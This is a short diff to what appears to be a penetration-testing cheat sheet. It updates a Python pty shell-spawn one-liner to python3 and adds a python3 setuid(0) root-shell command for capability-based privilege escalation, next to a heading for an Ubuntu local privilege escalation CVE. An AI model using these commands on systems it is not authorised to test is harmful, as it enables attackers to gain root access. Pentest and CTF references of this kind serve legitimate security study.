@@ -32,7 +32,7 @@ Shell SUDO / escape:
 Using python:
 
 ```shell
-python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 Using echo:
@@ -123,6 +123,9 @@ Escalate priv with getcap
 python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
+```bash
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
 Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629):
 
 ```bash
